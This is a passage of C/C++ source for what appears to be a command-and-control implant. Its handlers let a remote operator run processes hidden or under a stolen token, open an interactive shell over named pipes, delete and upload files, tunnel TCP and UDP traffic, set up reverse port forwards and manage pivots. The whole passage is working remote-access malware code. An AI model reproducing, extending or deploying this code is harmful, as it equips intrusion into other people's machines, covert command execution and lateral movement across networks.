				WCHAR* wArgs = (WCHAR*)MemAllocLocal(wLen * sizeof(WCHAR));
				if (wArgs) {
					ApiWin->MultiByteToWideChar(CP_ACP, 0, progArgs, -1, wArgs, wLen);
					result = ApiWin->CreateProcessWithTokenW(g_StoredToken, LOGON_WITH_PROFILE, NULL, wArgs, progState | CREATE_NO_WINDOW, NULL, NULL, &spiW, &pi);
					MemFreeLocal((LPVOID*)&wArgs, wLen * sizeof(WCHAR));
				}
			}
		}
	}
	else
		result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);

	if (result) {
		JobData job = JobsController_CreateJobData(self->agent->jober, taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, commandId);
		Packer_Pack32(outPacker, job.pidObject);
		Packer_Pack8(outPacker, progOutput);
		Packer_PackBytes(outPacker, (PBYTE)progArgs, progArgsSize);

		ApiNt->NtClose(pi.hThread);
		pi.hThread = NULL;
		if (!progOutput) {
			ApiNt->NtClose(pi.hProcess);
			pi.hProcess = NULL;
		}
	}
	else {
		if (pipeRead) {
			ApiNt->NtClose(pipeRead);
			pipeRead = NULL;
		}

		if (pipeWrite) {
			ApiNt->NtClose(pipeWrite);
			pipeWrite = NULL;
		}

		Packer_Pack32(outPacker, taskId);
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdPwd(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	CHAR  path[MAX_PATH] = { 0 };
	ULONG pathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, path);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	if (pathSize) {
		Packer_Pack32(outPacker, commandId);
		Packer_PackBytes(outPacker, (PBYTE)path, pathSize);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdRm(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)Packer_UnpackBytes(inPacker, &pathSize);
	ULONG taskId   = Packer_Unpack32(inPacker);

	Packer_Pack32(outPacker, taskId);

	DWORD dwAttrib = ApiWin->GetFileAttributesA(path);

	BOOL result = FALSE;
	BOOL directory = (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));

	if ( directory )
		result = ApiWin->RemoveDirectoryA(path);
	else
		result = ApiWin->DeleteFileA(path);

	if (result) {
		Packer_Pack32(outPacker, commandId);
		Packer_Pack8(outPacker, directory);
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdShellStart(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG shellId = Packer_Unpack32(inPacker);
	ULONG progArgsSize = 0;
	CHAR* progArgs = (CHAR*)Packer_UnpackBytes(inPacker, &progArgsSize);
	ULONG taskId = Packer_Unpack32(inPacker);

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA        spi = { 0 };
	spi.cb = sizeof(STARTUPINFOA);
	spi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	spi.wShowWindow = SW_HIDE;

	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

	ULONG r1 = GenerateRandom32();

	CHAR* pipeName = (CHAR*) MemAllocLocal(18);
	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);

	HANDLE beaconOutPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
	HANDLE shellOutPipe  = ApiWin->CreateFileA(pipeName, FILE_WRITE_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	
	r1 = GenerateRandom32();
	ApiWin->snprintf(pipeName, 18, "\\\\.\\pipe\\%08lx", r1);
	
	HANDLE beaconInPipe = ApiWin->CreateNamedPipeA(pipeName, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 0x4000, 0x4000, 0, &sa);
	HANDLE shellInPipe  = ApiWin->CreateFileA(pipeName, FILE_READ_DATA | SYNCHRONIZE, 0, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	MemFreeLocal((LPVOID*) &pipeName, 18);

	spi.hStdInput  = shellInPipe;
	spi.hStdOutput = shellOutPipe;
	spi.hStdError  = shellOutPipe;

	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);

	ApiNt->NtClose(shellOutPipe);
	ApiNt->NtClose(shellInPipe);

	if (result) {

		JobData job = JobsController_CreateJobData(self->agent->jober, shellId, JOB_TYPE_SHELL, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, beaconOutPipe, beaconInPipe);

		Packer_Pack32(outPacker, shellId);
		Packer_Pack32(outPacker, COMMAND_JOB);
		Packer_Pack8(outPacker, JOB_TYPE_SHELL);
		Packer_Pack8(outPacker, JOB_STATE_STARTING);
	}
	else {
		if (beaconOutPipe) {
			ApiNt->NtClose(beaconOutPipe);
			beaconOutPipe = NULL;
		}

		if (beaconInPipe) {
			ApiNt->NtClose(beaconInPipe);
			beaconInPipe = NULL;
		}

		Packer_Pack32(outPacker, shellId);
		Packer_Pack32(outPacker, COMMAND_JOB);
		Packer_Pack8(outPacker, JOB_TYPE_SHELL);
		Packer_Pack8(outPacker, JOB_STATE_FINISHED);
		Packer_Pack32(outPacker, TEB->LastErrorValue);
	}
}

void Commander_CmdShellWrite(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker) 
{
	ULONG jobId = Packer_Unpack32(inPacker);
	ULONG dataSize = 0;
	CHAR* data = (CHAR*)Packer_UnpackBytes(inPacker, &dataSize);
	ULONG taskId = Packer_Unpack32(inPacker);

	for (int i = 0; i < self->agent->jober->jobs.size(); i++) {
		if (jobId == self->agent->jober->jobs[i].jobId && self->agent->jober->jobs[i].jobState == JOB_STATE_RUNNING && self->agent->jober->jobs[i].pipeWrite) {
			DWORD written = 0;
			ApiWin->WriteFile(self->agent->jober->jobs[i].pipeWrite, data, dataSize, &written, NULL);
			break;
		}
	}
}

void Commander_CmdTerminate(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	self->agent->config->exit_method  = Packer_Unpack32(inPacker);
	self->agent->config->exit_task_id = Packer_Unpack32(inPacker);
	self->agent->Active = FALSE;
}

void Commander_CmdTunnelMsgConnectTCP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker) 
{
	ULONG channelId  = Packer_Unpack32(inPacker);
	ULONG tunnelType = Packer_Unpack32(inPacker);
	ULONG addrSize   = 0;
	CHAR* addr       = (CHAR*)Packer_UnpackBytes(inPacker, &addrSize);
	WORD  port       = Packer_Unpack32(inPacker);
	ULONG taskId     = Packer_Unpack32(inPacker);

	Proxyfire_ConnectMessageTCP(self->agent->proxyfire, channelId, tunnelType, addr, port, outPacker);
}

void Commander_CmdTunnelMsgConnectUDP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG channelId = Packer_Unpack32(inPacker);
	ULONG addrSize = 0;
	CHAR* addr = (CHAR*)Packer_UnpackBytes(inPacker, &addrSize);
	WORD  port = Packer_Unpack32(inPacker);
	ULONG taskId = Packer_Unpack32(inPacker);

	Proxyfire_ConnectMessageUDP(self->agent->proxyfire, channelId, addr, port, outPacker);
}

void Commander_CmdTunnelMsgWriteTCP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG channelId = Packer_Unpack32(inPacker);
	ULONG dataSize  = 0;
	CHAR* data      = (CHAR*)Packer_UnpackBytes(inPacker, &dataSize);
	ULONG taskId	= Packer_Unpack32(inPacker);

	Proxyfire_ConnectWriteTCP(self->agent->proxyfire, channelId, data, dataSize, outPacker);
}

void Commander_CmdTunnelMsgWriteUDP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG channelId = Packer_Unpack32(inPacker);
	ULONG dataSize = 0;
	CHAR* data = (CHAR*)Packer_UnpackBytes(inPacker, &dataSize);
	ULONG taskId = Packer_Unpack32(inPacker);

	Proxyfire_ConnectWriteUDP(self->agent->proxyfire, channelId, data, dataSize);
}

void Commander_CmdTunnelMsgPause(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG channelId = Packer_Unpack32(inPacker);
	Proxyfire_ConnectPause(self->agent->proxyfire, channelId);
}

void Commander_CmdTunnelMsgResume(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG channelId = Packer_Unpack32(inPacker);
	Proxyfire_ConnectResume(self->agent->proxyfire, channelId);
}

void Commander_CmdTunnelMsgClose(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG channelId = Packer_Unpack32(inPacker);
	Proxyfire_ConnectClose(self->agent->proxyfire, channelId);
}

void Commander_CmdTunnelMsgReverse(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG tunnelId = Packer_Unpack32(inPacker);
	WORD  port     = Packer_Unpack32(inPacker);
	ULONG taskId   = Packer_Unpack32(inPacker);
	Proxyfire_ConnectMessageReverse(self->agent->proxyfire, tunnelId, port, outPacker);
}

void Commander_CmdUnlink(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG pivotId = Packer_Unpack32(inPacker);
	ULONG taskId  = Packer_Unpack32(inPacker);

	Pivotter_UnlinkPivot(self->agent->pivotter, taskId, commandId, pivotId, outPacker);
}

void Commander_CmdUpload(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId = Packer_Unpack32(inPacker);
	ULONG pathSize = 0;
	CHAR* path     = (CHAR*)Packer_UnpackBytes(inPacker, &pathSize);
	ULONG taskId   = Packer_Unpack32(inPacker);
	
	Packer_Pack32(outPacker, taskId);

	if ( !self->agent->memorysaver->chunks.contains(memoryId) )
		return;

	MemoryData memData = self->agent->memorysaver->chunks[memoryId];
	if (memData.complete) {

		BOOL  result  = false;
		DWORD written = 0;

		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);

		if (result) {
			Packer_Pack32(outPacker, COMMAND_UPLOAD);
		}
		else {
			Packer_Pack32(outPacker, COMMAND_ERROR);
			Packer_Pack32(outPacker, TEB->LastErrorValue);
		}

		if (hFile) {
			ApiNt->NtClose(hFile);
			hFile = NULL;
		}
	}
	else {
		Packer_Pack32(outPacker, COMMAND_ERROR);
		Packer_Pack32(outPacker, 2);
	}
	MemorySaver_RemoveMemoryData(self->agent->memorysaver, memoryId);
}



void Commander_CmdSaveMemory(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
{
	ULONG memoryId   = Packer_Unpack32(inPacker);
	ULONG totalSize  = Packer_Unpack32(inPacker);
	ULONG bufferSize = 0;
	BYTE* buffer     = Packer_UnpackBytes(inPacker, &bufferSize);
	ULONG taskId     = Packer_Unpack32(inPacker);

	MemorySaver_WriteMemoryData(self->agent->memorysaver, memoryId, totalSize, bufferSize, buffer);
}

void Commander_Exit(Commander* self, Packer* outPacker)
{
	Packer_Pack32(outPacker, self->agent->config->exit_task_id);
	Packer_Pack32(outPacker, COMMAND_TERMINATE);
	Packer_Pack32(outPacker, self->agent->config->exit_method);
}